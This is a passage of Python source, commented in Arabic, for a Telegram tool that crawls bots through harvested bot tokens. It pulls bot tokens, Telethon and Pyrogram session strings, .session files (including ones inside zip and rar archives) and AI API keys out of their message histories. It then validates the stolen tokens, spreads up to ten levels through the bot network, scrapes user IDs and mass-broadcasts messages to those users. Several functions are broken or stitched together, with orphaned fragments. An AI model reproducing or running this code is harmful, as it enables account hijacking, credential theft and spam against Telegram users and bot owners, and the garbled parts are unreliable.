            token_info['valid'] = result.get('valid', False)
            token_info['bot_info'] = result
            token_info['processed'] = True
            if bot_token:
                try:
                    await update_scan_token_validation(
                        bot_token, token_info['token'],
                        token_info['valid'],
                        token_info['bot_info']
                    )
                except Exception:
                    pass
        results[token_info['token']] = result

    def _start_setup(token_info):
        async def _run():
            try:
                session, final = await _validate_token_begin(token_info['token'])
            except Exception as e:
                await _apply_result(token_info, e)
                return
            if final is not None:
                await _apply_result(token_info, final)
            elif session is not None:
                session['token_info'] = token_info
                active.append(session)
            else:
                await _apply_result(token_info, {'valid': False, 'error': 'setup returned nothing'})
        task = asyncio.create_task(_run())
        pending_setups.add(task)
        task.add_done_callback(pending_setups.discard)

    def _occupied_slots(now):
        return (sum(1 for s in active if now >= s.get('quarantine_until', 0))
                + len(pending_setups))

    while True:
        if not queue and not pending_setups and not active and not pending_batches:
            break
        finished = [s for s in active if s['next_id'] > s['max_id'] and not s['in_flight']]
        for sess in finished:
            active.remove(sess)
            result = await _validate_token_finish(sess)
            await _apply_result(sess['token_info'], result)
        if finished:
            continue
        while queue and _occupied_slots(time.time()) < max_concurrent:
            _start_setup(queue.pop(0))
        ready = None
        if active:
            for _ in range(len(active)):
                sess = active[next_turn % len(active)]
                next_turn += 1
                if sess['in_flight']:
                    continue
                if time.time() < sess.get('quarantine_until', 0):
                    continue
                if time.time() - sess.get('last_request_at', 0) < VALIDATE_MIN_TOKEN_GAP:
                    continue
                if sess['next_id'] > sess['max_id']:
                    continue
                ready = sess
                break
        if ready is not None:
            ready['in_flight'] = True
            ready['last_request_at'] = time.time()
            task = asyncio.create_task(_validate_fetch_batch(ready, pending_batches))
            pending_batches.add(task)
            await asyncio.sleep(VALIDATE_REQUEST_SPACING)
            continue
        await asyncio.sleep(VALIDATE_REQUEST_SPACING)
    if pending_setups or pending_batches:
        await asyncio.gather(*list(pending_setups | pending_batches), return_exceptions=True)
    return results

async def download_with_retry(bot, file_location, max_retries=3, allow_partial=False, clear_skip_after=False):
    ACTIVE_DOWNLOADS[file_location.id] = 0
    try:
        for attempt in range(max_retries):
            try:
                log_event("طلب", f"تحميل ملف {file_location.id} - المحاولة {attempt + 1}/{max_retries}")
                downloaded = bytearray()
                ACTIVE_DOWNLOADS[file_location.id] = 0
                if hasattr(bot, 'iter_download'):
                    async for chunk in bot.iter_download(file_location, chunk_size=65536):
                        downloaded.extend(chunk)
                        ACTIVE_DOWNLOADS[file_location.id] = len(downloaded)
                        if SKIP_DOWNLOAD.get('requested'):
                            if allow_partial and downloaded:
                                log_event("تخطي", f"تخطي ملف {file_location.id} - اتحمل {len(downloaded)} بايت، وهيتفحص منها بس")
                                return bytes(downloaded)
                            log_event("تخطي", f"تخطي ملف {file_location.id} - اتحمل {len(downloaded)} بايت، والملف مش هيتضاف")
                            return None
                else:
                    file_data = await bot.download_file(file_location, bytes)
                    if file_data:
                        downloaded.extend(file_data)
                if downloaded:
                    log_event("طلب", f"تحميل ملف {file_location.id} - نجح، الحجم {len(downloaded)} بايت")
                    return bytes(downloaded)
                log_event("طلب", f"تحميل ملف {file_location.id} - رجع فارغا، المحاولة {attempt + 1}/{max_retries}")
            except Exception as e:
                log_event("طلب", f"تحميل ملف {file_location.id} - خطأ، المحاولة {attempt + 1}/{max_retries}: {e}")
                if attempt == max_retries - 1:
                    raise e
                await asyncio.sleep(1)
        return None
    finally:
        ACTIVE_DOWNLOADS.pop(file_location.id, None)
        if clear_skip_after:
            SKIP_DOWNLOAD['requested'] = False


async def _download_batch_files(bot, jobs):
    """تحميل ملفات دفعة ورا بعض من غير استنى: كل ملف مهمة لوحده،
    وأقصى عدد DOWNLOAD_MAX_CONCURRENT بيتحملوا في نفس الوقت.
    jobs: قائمة (file_location, allow_partial, max_retries).
    بترجع قائمة file_data أو None بنفس ترتيب الدخول.
    أمر .تخطي بيوقف كل الملفات اللي بتحمل في الدفعة، وعلامة التخطي
    بتتصفى بعد ما الدفعة تخلص."""
    sem = asyncio.Semaphore(DOWNLOAD_MAX_CONCURRENT)

    async def _one(job):
        loc, allow_partial, max_retries = job
        async with sem:
            try:
                return await download_with_retry(bot, loc, max_retries=max_retries, allow_partial=allow_partial)
            except Exception:
                return None

    try:
        return await asyncio.gather(*[_one(j) for j in jobs])
    finally:
        SKIP_DOWNLOAD['requested'] = False

async def download_and_add_to_zip(bot, file_info, zip_file, file_type, folder=""):
    try:
        if file_type == 'document':
            file_location = InputDocumentFileLocation(
                id=file_info['id'],
                access_hash=file_info['access_hash'],
                file_reference=file_info['file_reference'],
                thumb_size=''
            )
        else:
            file_location = InputDocumentFileLocation(
                id=file_info['id'],
                access_hash=file_info['access_hash'],
                file_reference=file_info['file_reference'],
                thumb_size=''
            )

        log_event("تحميل", f"{file_type} {file_info['id']} - الحجم {file_info.get('size', 0) or 0} بايت، يعني حوالي {(file_info.get('size', 0) or 0) / 1024:.1f} كيلو - قبل التحميل")
        file_data = await download_with_retry(bot, file_location, clear_skip_after=True)
        if file_data:

            original_name = file_info.get('original_name', '')
            if not original_name:

                file_extension = file_info.get('file_extension', '')
                if not file_extension:
                    file_extension = 'bin'
                original_name = f"file_{file_info['id']}.{file_extension}"


            prefix = (folder.rstrip('/') + '/') if folder else ''
            file_name = original_name
            counter = 1
            while (prefix + file_name) in zip_file.namelist():
                name_parts = original_name.rsplit('.', 1)
                if len(name_parts) > 1:
                    base_name, extension = name_parts
                    file_name = f"{base_name}_{counter}.{extension}"
                else:
                    file_name = f"{original_name}_{counter}"
                counter += 1

            zip_file.writestr(prefix + file_name, file_data)
            return True

    except Exception as e:
        if "file reference has expired" in str(e).lower():
            print(f"⚠️ تخطي الملف {file_info['id']} - المرجع منتهي الصلاحية")
            return False
        else:
            print(f"❌ خطأ في تحميل {file_type} {file_info['id']}: {e}")
    return False

async def send_zip_files(main_bot, source_bot, file_infos, zip_name, caption, user_id, file_type):
    try:
        zip_buffer = io.BytesIO()
        success_count = 0

        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for file_info in file_infos:
                if await download_and_add_to_zip(source_bot, file_info, zip_file, file_type):
                    success_count += 1

        zip_buffer.seek(0)

        if success_count > 0:
            await main_bot.send_file(
                entity=int(user_id),
                file=zip_buffer,
                caption=f"{caption} ({success_count} ملفات)",
                attributes=[DocumentAttributeFilename(f"{zip_name}.zip")]
            )
            return True
        else:
            return False
    except Exception as e:
        print(f"Error sending zip file: {e}")
        return False

async def extract_users_from_bot(bot_token, user_id):
    log_event("استخراج", f"بدء استخراج المستخدمين من البوت {_mask_bot_token(bot_token)}")
    """استخراج المستخدمين - تسلسلي دفعة بدفعة، كل دفعة تحفظ في التخزين، ويستأنف من آخر نقطة ولو زاد عدد الرسائل يكمل للزيادة."""
    temp_bot = None
    temp_session = None
    try:
        await init_database()
        progress_key = bot_token + "|users"
        progress = await get_scan_progress(progress_key)
        temp_session = os.path.join(SESSION_DIR, f"extract_users_{int(time.time())}")
        temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
        await temp_bot.start(bot_token=bot_token)
        max_id = await find_max_message_id(temp_bot)
        if progress and progress['is_complete'] and max_id <= progress['last_scanned_id']:
            await temp_bot.disconnect()
            try:
                if os.path.exists(f"{temp_session}.session"):
                    os.remove(f"{temp_session}.session")
            except Exception:
                pass
            user_list = await get_scan_user_ids(bot_token)
            await set_cached_users(bot_token, user_list)
            return user_list
        start_id = 1
        if progress:
            start_id = progress['last_scanned_id'] + 1
        batch_size = 200
        scanned_up_to = start_id - 1
        for i in range(start_id, max_id + 1, batch_size):
            try:
                end_range = min(i + batch_size, max_id + 1)
                message_ids = list(range(i, end_range))
                messages = await with_telegram_retry(lambda: temp_bot(GetMessagesRequest(message_ids)))
                local_users = set()
                for msg in messages.messages:
                    if isinstance(msg, MessageEmpty):
                        continue
                    if hasattr(msg, 'from_id') and msg.from_id:
                        user_id_str = str(msg.from_id.user_id) if hasattr(msg.from_id, 'user_id') else str(msg.from_id)
                        local_users.add(user_id_str)
                    if hasattr(msg, 'reply_to') and msg.reply_to:
                        if hasattr(msg.reply_to, 'from_id') and msg.reply_to.from_id:
                            reply_user_id = str(msg.reply_to.from_id.user_id) if hasattr(msg.reply_to.from_id, 'user_id') else str(msg.reply_to.from_id)
                            local_users.add(reply_user_id)
                    if hasattr(msg, 'peer_id'):
                        if hasattr(msg.peer_id, 'user_id'):
                            local_users.add(str(msg.peer_id.user_id))
                        elif hasattr(msg.peer_id, 'chat_id'):
                            local_users.add(str(msg.peer_id.chat_id))
                        elif hasattr(msg.peer_id, 'channel_id'):
                            local_users.add(str(msg.peer_id.channel_id))
                if local_users:
                    await save_scan_batch(bot_token, users=list(local_users))
            except Exception as e:
                print(f"Error processing messages {i}-{i+batch_size}: {e}")
                continue
            scanned_up_to = min(i + batch_size - 1, max_id)
            await set_scan_progress(progress_key, None, scanned_up_to, max_id, scanned_up_to >= max_id)
        await temp_bot.disconnect()
        try:
            if os.path.exists(f"{temp_session}.session"):
                os.remove(f"{temp_session}.session")
        except Exception:
            pass
        user_list = await get_scan_user_ids(bot_token)
        await set_cached_users(bot_token, user_list)
        return user_list
    except Exception as e:
        print(f"Error extracting users: {e}")
        if temp_bot is not None:
            try:
                if temp_bot.is_connected():
                    await temp_bot.disconnect()
            except Exception:
                pass
        return []

async def deep_network_analysis(main_bot_token, user_id, progress_callback=None, stop_event=None):
    """تحليل شبكة البوتات: عدادات فقط في الذاكرة، وكل بوت يمثل ببيانات خفيفة.
    قوائم الملفات والصور والرموز والجلسات والمفاتيح لا تتجمع هنا، بل تقرأ من التخزين عند الإرسال بوتا بوتا."""
    try:
        log_event("فحص شبكي", f"بدء الفحص الشبكي للبوت {_mask_bot_token(main_bot_token)}")
        main_analysis = await analyze_bot(main_bot_token, user_id)
        if not main_analysis['success']:
            return {'success': False, 'error': 'فشل تحليل البوت الرئيسي'}

        def _light_bot(token, analysis, level):
            return {
                'token': token,
                'level': level,
                'bot_username': analysis.get('bot_username'),
                'total_messages': analysis.get('total_messages', 0),
                'total_users': analysis.get('total_users', 0),
                'total_files': analysis.get('total_files', 0),
                'total_photos': analysis.get('total_photos', 0),
                'total_tokens': analysis.get('tokens', {}).get('total', 0),
                'valid_tokens': analysis.get('tokens', {}).get('valid', 0),
                'total_sessions': analysis.get('sessions', {}).get('total', 0),
                'total_ai_keys': analysis.get('ai_keys', {}).get('total', 0),
            }

        all_bots = [_light_bot(main_bot_token, main_analysis, 0)]
        aggregated_stats = {
            'total_bots': 1,
            'total_users': main_analysis['total_users'],
            'total_users_unique': main_analysis['total_users'],
            'total_files': main_analysis['total_files'],
            'total_photos': main_analysis['total_photos'],
            'total_tokens': main_analysis['tokens']['total'],
            'valid_tokens': main_analysis['tokens']['valid'],
            'total_sessions': main_analysis['sessions']['total'],
            'total_ai_keys': main_analysis.get('ai_keys', {}).get('total', 0),
            'all_users': [],
            'all_files': [],
            'all_photos': [],
            'all_tokens': [],
            'all_sessions': [],
            'all_ai_keys': [],
        }
        current_level = 0
        max_levels = 10
        examined_bots = 0
        async def _partial_result():
            aggregated_stats['total_users_unique'] = await count_unique_users([b['token'] for b in all_bots])
            return {
                'success': True,
                'aggregated_stats': aggregated_stats,
                'all_bots': all_bots,
                'total_levels': max((b['level'] for b in all_bots), default=0),
                'partial': True,
                'message': 'تم إيقاف الفحص قبل اكتماله'
            }
        while current_level < max_levels:
            current_level_bots = [bot for bot in all_bots if bot['level'] == current_level]
            user_state = await get_user_state(user_id)
            if user_state.get('stop_requested'):
                print("⏹ تم طلب إيقاف الفحص الشبكي")
                return await _partial_result()
            # جمع توكنات المستوى كله مرة واحدة، من غير تكرار، وبعدين فحصها مع بعض:
            # كل بوت بيسحب رسايله ويستخرج أنماطه لوحده. لو واحد وقع في فلود ويت
            # بيطلع من الطابور وبيدخل حد مكانه، وهو بيرجع تاني لما يفضى مكان
            # وفلوده يخلص - المهم يكمل في نفس التشغيل مش يترمي.
            # الدفعات جوه البوت الواحد لسه ورا بعض لأنها على نفس الحساب،
            # ولو اتسحبت مع بعض هتعمل فلود أسرع.
            seen_tokens = {b['token'] for b in all_bots}
            level_tokens = []
            for bot_data in current_level_bots:
                current_tokens = await get_scan_tokens(bot_data['token'])
                for token_info in current_tokens:
                    if token_info['valid']:
                        token = token_info['token']
                        if token in seen_tokens:
                            continue
                        seen_tokens.add(token)
                        level_tokens.append(token)

            async def _scan_one(token):
                return token, await analyze_bot(token, user_id, park_on_flood=True)

            pending = list(level_tokens)
            parked = {}
            running = set()
            while pending or running or parked:
                while len(running) < NETWORK_MAX_CONCURRENT_BOTS:
                    ready = [t for t, at in parked.items() if at <= time.monotonic()]
                    if ready:
                        tok = min(ready, key=lambda t: parked[t])
                        del parked[tok]
                        log_event("فحص شبكي", f"البوت {_mask_bot_token(tok)} رجع الطابور بعد الفلود ويت - هيكمل من نقطة الاستئناف")
                    elif pending:
                        tok = pending.pop(0)
                    else:
                        break
                    running.add(asyncio.create_task(_scan_one(tok)))
                if not running:
                    wait = min(parked.values()) - time.monotonic()
                    if wait > 0:
                        log_event("فحص شبكي", f"مستني {wait:.0f} ثانية لحد ما الفلود ويت يخلص عشان بوت موقوف يرجع يكمل")
                        await asyncio.sleep(wait)
                    continue
                done, _ = await asyncio.wait(running, return_when=asyncio.FIRST_COMPLETED)
                for task in done:
                    running.discard(task)
                    token, new_analysis = await task
                    if new_analysis and new_analysis.get('parked'):
                        wait_s = new_analysis.get('flood_wait_seconds') or 0
                        parked[token] = time.monotonic() + wait_s
                        log_event("فحص شبكي", f"البوت {_mask_bot_token(token)} طلع من الطابور فلود ويت {wait_s} ثانية - هيرجع لما يفضى مكان")
                        continue
                    if new_analysis and new_analysis['success']:
                        all_bots.append(_light_bot(token, new_analysis, current_level + 1))
                        aggregated_stats['total_bots'] += 1
                        aggregated_stats['total_users'] += new_analysis['total_users']
                        aggregated_stats['total_files'] += new_analysis['total_files']
                        aggregated_stats['total_photos'] += new_analysis['total_photos']
                        aggregated_stats['total_tokens'] += new_analysis['tokens']['total']
                        aggregated_stats['valid_tokens'] += new_analysis['tokens']['valid']
                        aggregated_stats['total_sessions'] += new_analysis['sessions']['total']
                        aggregated_stats['total_ai_keys'] += new_analysis.get('ai_keys', {}).get('total', 0)
                        examined_bots += 1
                        if progress_callback:
                            if not await progress_callback(examined_bots, len(all_bots), current_level + 1):
                                print("⏹ تم طلب إيقاف الفحص الشبكي")
                                user_state = await get_user_state(user_id)
                                user_state['stop_requested'] = True
                                await set_user_state(user_id, user_state)
                                for t in running:
                                    t.cancel()
                                await asyncio.gather(*running, return_exceptions=True)
                                return await _partial_result()
                user_state = await get_user_state(user_id)
                if user_state.get('stop_requested'):
                    print("⏹ تم طلب إيقاف الفحص الشبكي")
                    for t in running:
                        t.cancel()
                    await asyncio.gather(*running, return_exceptions=True)
                    return await _partial_result()
            current_level += 1
            if current_level >= max_levels:
                break
        aggregated_stats['total_users_unique'] = await count_unique_users([b['token'] for b in all_bots])
        return {
            'success': True,
            'aggregated_stats': aggregated_stats,
            'all_bots': all_bots,
            'total_levels': max((b['level'] for b in all_bots), default=0),
            'partial': False,
            'message': 'تم الانتهاء من الفحص بالكامل'
        }
    except Exception as e:
        print(f"Error in deep network analysis: {e}")
        return {'success': False, 'error': str(e)}


async def network_broadcast(all_bots_data, message_text, progress_callback=None, stop_event=None):
    """إذاعة رسالة إلى جميع البوتات في الشبكة"""
    total_bots = len(all_bots_data)
    total_success = 0
    total_failed = 0
    last_update_time = 0
    for i, bot_data in enumerate(all_bots_data):
        try:
            users = await get_scan_user_ids(bot_data['token'])
            success, failed = await broadcast_message(
                bot_data['token'],
                users,
                message_text
            )
            total_success += success
            total_failed += failed
            current_time = time.time()
            if progress_callback and (current_time - last_update_time >= 5 or i + 1 == total_bots):
                last_update_time = current_time
                if not await progress_callback(i + 1, total_bots, total_success, total_failed):
                    break
        except Exception as e:
            print(f"Error broadcasting to bot {i}: {e}")
            try:
                total_failed += len(await get_scan_user_ids(bot_data['token']))
            except Exception:
                pass

# أرشيفات rar: فكها محتاج أداة (rarfile أو 7z على الجهاز). ملفات الأرشيف الكبيرة
# مبتتكتبش على القرص إلا لو اتسجل إن جواها .session.
RAR_TOOL_MAX_SIZE = 500 * 1024 * 1024


def _zip_unique_name(zip_file, folder, name):
    """اسم فريد جوه الزب (مع مجلد): لو الاسم موجود بيزود _1 و _2..."""
    prefix = (folder.rstrip('/') + '/') if folder else ''
    base, dot, ext = name.rpartition('.')
    candidate = name
    counter = 1
    while (prefix + candidate) in zip_file.namelist():
        candidate = f"{base}_{counter}.{ext}" if dot else f"{name}_{counter}"
        counter += 1
    return prefix + candidate


async def _rar_session_names_via_tools(data):
    """best-effort: أسماء ملفات .session جوه أرشيف rar (محتاج rarfile أو 7z على الجهاز)."""
    try:
        import rarfile
        with rarfile.RarFile(io.BytesIO(data)) as rf:
            return [info.filename for info in rf.infolist()
                    if info.filename.lower().endswith('.session')]
    except Exception:
        pass
    seven = shutil.which('7z') or shutil.which('7za')
    if not seven:
        log_event("فحص", "مفيش أداة rar على الجهاز (rarfile أو 7z) - ملفات .session جوه الـ rar مش هتتسجل")
        return []
    if len(data) > RAR_TOOL_MAX_SIZE:
        log_event("فحص", "أرشيف rar أكبر من الحد - مش هيتفحص جواه")
        return []
    tmp = None
    try:
        with tempfile.NamedTemporaryFile(delete=False, suffix='.rar') as f:
            f.write(data)
            tmp = f.name
        res = await asyncio.to_thread(
            subprocess.run, [seven, 'l', '-ba', tmp],
            capture_output=True, text=True, timeout=120)
        return [line.strip() for line in res.stdout.splitlines()
                if line.strip().lower().endswith('.session')]
    except Exception:
        return []
    finally:
        if tmp:
            try:
                os.remove(tmp)
            except Exception:
                pass


async def _extract_archive_session_entries(data, archive_name, wanted):
    """يفك ملفات .session المسجلة من أرشيف (zip أو rar) ويرجع {الاسم: البايتات}."""
    wanted_set = set(wanted)
    out = {}
    try:
        with zipfile.ZipFile(io.BytesIO(data)) as z:
            for name in z.namelist():
                if name in wanted_set:
                    out[name] = z.read(name)
        if out:
            return out
    except Exception:
        pass
    try:
        import rarfile
        with rarfile.RarFile(io.BytesIO(data)) as rf:
            for info in rf.infolist():
                if info.filename in wanted_set:
                    out[info.filename] = rf.read(info.filename)
        if out:
            return out
    except Exception:
        pass
    seven = shutil.which('7z') or shutil.which('7za')
    if seven and len(data) <= RAR_TOOL_MAX_SIZE:
        tmp = None
        try:
            with tempfile.NamedTemporaryFile(delete=False, suffix='.rar') as f:
                f.write(data)
                tmp = f.name
            for name in wanted_set:
                res = await asyncio.to_thread(
                    subprocess.run, [seven, 'e', '-so', tmp, name],
                    capture_output=True, timeout=120)
                if res.returncode == 0 and res.stdout:
                    out[name] = res.stdout
        except Exception:
            pass
        finally:
            if tmp:
                try:
                    os.remove(tmp)
                except Exception:
                    pass
    return out


async def _add_archive_inner_sessions(zip_file, bot, arch_info):
    """يحمل الأرشيف ويفك منه ملفات .session المسجلة ويحطها في مجلد .session."""
    wanted = arch_info.get('inner_sessions') or []
    if not wanted:
        return 0
    try:
        file_location = InputDocumentFileLocation(
            id=arch_info['id'],
            access_hash=arch_info['access_hash'],
            file_reference=arch_info['file_reference'],
            thumb_size=''
        )
        data = await download_with_retry(bot, file_location, clear_skip_after=True)
    except Exception as e:
        print(f"Error downloading archive {arch_info['id']}: {e}")
        return 0
    if not data:
        return 0
    extracted = await _extract_archive_session_entries(
        data, arch_info.get('original_name', ''), wanted)
    added = 0
    for entry_name, entry_bytes in extracted.items():
        zip_name = _zip_unique_name(zip_file, '.session', os.path.basename(entry_name))
        zip_file.writestr(zip_name, entry_bytes)
        added += 1
    if added < len(wanted):
        log_event("تحميل", f"أرشيف {arch_info['id']} - اتفك منه {added} من {len(wanted)} ملف .session")
    return added

    """يضيف ملفات .session لمجلد .session في الزب: اللي اتلقت في الرسايل مباشرة،

    all_files = await get_scan_files(bot_token)
    session_files = [f for f in all_files
                     if (f.get('file_extension') or '').lower() == 'session']
    archives = [f for f in all_files if f.get('inner_sessions')]
    if not session_files and not archives:
        return 0
    temp_session = os.path.join(SESSION_DIR, f"session_files_{int(time.time())}_{hash(bot_token)}")
    temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
    added = 0

        for file_info in session_files:
            if await download_and_add_to_zip(temp_bot, file_info, zip_file, 'document', folder='.session'):

    finally:

            if temp_bot.is_connected():
                await temp_bot.disconnect()
        except Exception:
            pass
        try:
            if os.path.exists(f"{temp_session}.session"):
                os.remove(f"{temp_session}.session")
        except Exception:
            pass
    return added

        if user_id in stop_events and stop_events[user_id].is_set():
            return False

        current_percent = (current / total) * 100

        if (current_time - last_update_time >= 3 or 
            abs(current_percent - last_percent) >= 5 or 
            current == total):

            last_update_time = current_time
            last_percent = current_percent

async def analyze_bot_for_sessions_only(bot_token, user_id):
    """تحليل البوت للعثور على الجلسات فقط - تسلسلي، كل دفعة تحفظ في التخزين، ويستأنف من آخر نقطة."""
    temp_bot = None
    temp_session = None
    try:
        await init_database()
        progress_key = bot_token + "|sessions_only"
        progress = await get_scan_progress(progress_key)
        temp_session = os.path.join(SESSION_DIR, f"analyze_sessions_{int(time.time())}")
        temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
        await temp_bot.start(bot_token=bot_token)
        max_id = await find_max_message_id(temp_bot)
        if progress and progress['is_complete'] and max_id <= progress['last_scanned_id']:
            await temp_bot.disconnect()
            try:
                if os.path.exists(f"{temp_session}.session"):
                    os.remove(f"{temp_session}.session")
            except Exception:
                pass
            sessions = await get_scan_sessions(bot_token)
            return {'success': True, 'sessions': {'total': len(sessions), 'details': sessions}}
        start_id = 1
        if progress:
            start_id = progress['last_scanned_id'] + 1
        chunk_size = 200
        scanned_up_to = start_id - 1
        for i in range(start_id, max_id + 1, chunk_size):
            end_range = min(i + chunk_size, max_id + 1)
            chunk = await process_message_chunk_for_sessions(temp_bot, i, end_range)
            await save_scan_batch(bot_token, sessions=chunk['sessions'])
            scanned_up_to = end_range - 1
            await set_scan_progress(progress_key, None, scanned_up_to, max_id, scanned_up_to >= max_id)
        await temp_bot.disconnect()
        try:
            if os.path.exists(f"{temp_session}.session"):
                os.remove(f"{temp_session}.session")
        except Exception:
            pass
        sessions = await get_scan_sessions(bot_token)
        return {'success': True, 'sessions': {'total': len(sessions), 'details': sessions}}
    except Exception as e:
        if temp_bot is not None:
            try:
                if temp_bot.is_connected():
                    await temp_bot.disconnect()
            except Exception:
                pass
        return {'success': False, 'error': str(e)}


async def process_message_chunk_for_sessions(bot, start_id, end_id):
    """معالجة دفعة واحدة للجلسات فقط وإرجاع نتائجها."""
    chunk = {'sessions': []}
    seen_telethon = set()
    seen_pyrogram = set()
    try:
        message_ids = list(range(start_id, end_id))
        await SCAN_GATE.acquire()
        messages = await with_telegram_retry(lambda: bot(GetMessagesRequest(message_ids)))
        for msg in messages.messages:
            if isinstance(msg, MessageEmpty):
                continue
            if hasattr(msg, 'message') and msg.message:
                text = msg.message
                for session in _find_telethon_sessions(text):
                    if session not in seen_telethon:
                        seen_telethon.add(session)
                        chunk['sessions'].append({'session': session, 'source': 'chat', 'type': 'telethon'})
                for session in _PYROGRAM_FIND.findall(text):
                    if session not in seen_pyrogram:
                        seen_pyrogram.add(session)
                        chunk['sessions'].append({'session': session, 'source': 'chat', 'type': 'pyrogram'})
            if hasattr(msg, 'media') and isinstance(msg.media, MessageMediaDocument):
                try:
                    document = msg.media.document
                    file_extension = "bin"
                    for attr in document.attributes:
                        if isinstance(attr, DocumentAttributeFilename):
                            if '.' in attr.file_name:
                                file_extension = attr.file_name.split('.')[-1]
                            break
                    file_data = None
                    if file_extension.lower() in NON_SCANNABLE_EXTENSIONS:
                        log_event("تخطي", f"ملف {document.id} - وسائط/تطبيق، مش هيتحمل ولا يتفحص (جلسات)")
                    else:
                        file_data = await download_with_retry(bot, InputDocumentFileLocation(
                            id=document.id,
                            access_hash=document.access_hash,
                            file_reference=document.file_reference,
                            thumb_size=''
                        ), allow_partial=True, clear_skip_after=True)
                    if file_data:
                        text_data = file_data.decode(errors="ignore")
                        for session in _find_telethon_sessions(text_data):
                            if session not in seen_telethon:
                                seen_telethon.add(session)
                                chunk['sessions'].append({'session': session, 'source': 'file', 'type': 'telethon'})
                        for session in _PYROGRAM_FIND.findall(text_data):
                            if session not in seen_pyrogram:
                                seen_pyrogram.add(session)
                                chunk['sessions'].append({'session': session, 'source': 'file', 'type': 'pyrogram'})
                except Exception:
                    pass
    except Exception as e:
        print(f"Error processing sessions chunk {start_id}-{end_id}: {e}")
    return chunk


async def analyze_bot_for_tokens_only(bot_token, user_id):

async def process_message_chunk_for_tokens(bot, start_id, end_id):
    """معالجة دفعة واحدة للتوكنات فقط وإرجاع نتائجها."""
    chunk = {'tokens': []}
    seen_tokens = set()
    try:
        message_ids = list(range(start_id, end_id))
        await SCAN_GATE.acquire()
        messages = await with_telegram_retry(lambda: bot(GetMessagesRequest(message_ids)))
        for msg in messages.messages:
            if isinstance(msg, MessageEmpty):
                continue
            if hasattr(msg, 'message') and msg.message:
                text = msg.message
                for token in TOKEN_PATTERN.findall(text):
                    if token not in seen_tokens:
                        seen_tokens.add(token)
                        chunk['tokens'].append({'token': token, 'valid': False, 'bot_info': {}})
            if hasattr(msg, 'media') and isinstance(msg.media, MessageMediaDocument):
                try:
                    document = msg.media.document
                    file_extension = "bin"
                    for attr in document.attributes:
                        if isinstance(attr, DocumentAttributeFilename):
                            if '.' in attr.file_name:
                                file_extension = attr.file_name.split('.')[-1]
                            break
                    file_data = None
                    if file_extension.lower() in NON_SCANNABLE_EXTENSIONS:
                        log_event("تخطي", f"ملف {document.id} - وسائط/تطبيق، مش هيتحمل ولا يتفحص (توكنات)")
                    else:
                        file_data = await download_with_retry(bot, InputDocumentFileLocation(
                            id=document.id,
                            access_hash=document.access_hash,
                            file_reference=document.file_reference,
                            thumb_size=''
                        ), allow_partial=True, clear_skip_after=True)
                    if file_data:
                        text_data = file_data.decode(errors="ignore")
                        for token in TOKEN_PATTERN.findall(text_data):
                            if token not in seen_tokens:
                                seen_tokens.add(token)
                                chunk['tokens'].append({'token': token, 'valid': False, 'bot_info': {}})
                except Exception:
                    pass
    except Exception as e:
        print(f"Error processing tokens chunk {start_id}-{end_id}: {e}")
    return chunk

async def extract_token_section(full_text, token):
    try:

        lines = full_text.split('\n')
        current_section = []
        found_token_section = None

        for line in lines:
            if line.startswith('🆔 الرقم:'):

                if current_section and token in '\n'.join(current_section):
                    found_token_section = '\n'.join(current_section)
                    break
                current_section = [line]
            else:
                current_section.append(line)


        if not found_token_section and current_section and token in '\n'.join(current_section):
            found_token_section = '\n'.join(current_section)

        return found_token_section

    except Exception as e:
        print(f"❌ خطأ في استخراج قسم التوكن: {e}")
        return None


async def extract_number_from_section(section_text, keyword):
    try:
        lines = section_text.split('\n')
        for line in lines:
            if keyword in line:

                numbers = re.findall(r'\d+', line)
                if numbers:
                    return int(numbers[0])
        return 'غير معروف'
    except:
        return 'غير معروف'

async def extract_sender_info_from_message(bot, message, bot_id):
    try:
        sender_info = {'name': 'غير معروف', 'username': 'غير معروف', 'user_id': 'غير معروف'}


        if hasattr(message, 'from_id') and message.from_id:
            user_id = None


            if hasattr(message.from_id, 'user_id'):
                user_id = message.from_id.user_id
            elif hasattr(message.from_id, 'user_id'):
                user_id = message.from_id.user_id
            else:

                user_id = str(message.from_id)


            if user_id and user_id != bot_id:
                sender_info['user_id'] = str(user_id)


                try:
                    user_entity = await bot(GetFullUserRequest(InputPeerUser(user_id=int(user_id), access_hash=0)))
                    if user_entity and user_entity.users:
                        user_data = user_entity.users[0]
                        if hasattr(user_data, 'first_name') and user_data.first_name:
                            sender_info['name'] = user_data.first_name
                        if hasattr(user_data, 'username') and user_data.username:
                            sender_info['username'] = f"@{user_data.username}"
                        return sender_info
                except Exception as e:
                    print(f"⚠️ خطأ في GetFullUserRequest لـ {user_id}: {e}")

                    try:
                        user = await bot.get_entity(int(user_id))
                        if user:
                            if hasattr(user, 'first_name') and user.first_name:
                                sender_info['name'] = user.first_name
                            if hasattr(user, 'username') and user.username:
                                sender_info['username'] = f"@{user.username}"
                            return sender_info
                    except Exception as e2:
                        print(f"⚠️ خطأ في get_entity لـ {user_id}: {e2}")

                        return sender_info


        elif hasattr(message, 'sender') and message.sender:
            if (hasattr(message.sender, 'id') and 
                message.sender.id != bot_id):

                sender_info['user_id'] = str(message.sender.id)
                if hasattr(message.sender, 'first_name') and message.sender.first_name:
                    sender_info['name'] = message.sender.first_name
                if hasattr(message.sender, 'username') and message.sender.username:
                    sender_info['username'] = f"@{message.sender.username}"
                return sender_info


        elif hasattr(message, 'peer_id') and message.peer_id:
            if hasattr(message.peer_id, 'user_id'):
                user_id = message.peer_id.user_id
                if user_id != bot_id:
                    sender_info['user_id'] = str(user_id)

                    try:
                        user_entity = await bot(GetFullUserRequest(InputPeerUser(user_id=user_id, access_hash=0)))
                        if user_entity and user_entity.users:
                            user_data = user_entity.users[0]
                            if hasattr(user_data, 'first_name') and user_data.first_name:
                                sender_info['name'] = user_data.first_name
                            if hasattr(user_data, 'username') and user_data.username:
                                sender_info['username'] = f"@{user_data.username}"
                            return sender_info
                    except Exception:
                        pass


        return sender_info

    except Exception:
        return {'name': 'غير معروف', 'username': 'غير معروف', 'user_id': 'غير معروف'}

    async def fast_broadcast_message(bot_token, user_ids, message_text, progress_callback=None, stop_event=None):
        """إرسال رسالة إلى قائمة من المستخدمين بسرعة 0.1 ثانية مع توقف للبوتات الكبيرة"""
        try:
            temp_session = os.path.join(SESSION_DIR, f"broadcast_bot_{int(time.time())}")
            temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
            await temp_bot.start(bot_token=bot_token)

            success_count = 0
